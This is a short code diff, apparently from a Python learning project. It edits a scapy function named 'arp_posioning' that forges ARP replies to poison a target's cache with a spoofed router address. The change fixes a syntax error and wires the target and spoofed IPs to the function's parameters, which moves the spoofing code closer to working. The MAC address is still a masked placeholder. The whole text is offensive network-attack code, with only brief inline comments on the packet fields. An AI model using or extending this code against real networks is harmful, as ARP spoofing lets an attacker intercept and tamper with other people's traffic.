@@ -8,6 +8,6 @@ def arp_posioning(target_ip, poisoned_ip):
     # pdst -> IP field: Set to target IP address.
     # hwdst -> Target Mac address. 
     # psrc -> Router IP address.
-    arp response = scapy.ARP(op=2, pdst = "##.#.#.#", hwdst = "##:##:##:##:##:##", psrc = "##.#.#.#")
+    arp_response = scapy.ARP(op=2, pdst = target_ip, hwdst = "##:##:##:##:##:##", psrc = poisoned_ip)
     scapy.send(arp_response)
     scapy.ls(scapy.ARP())
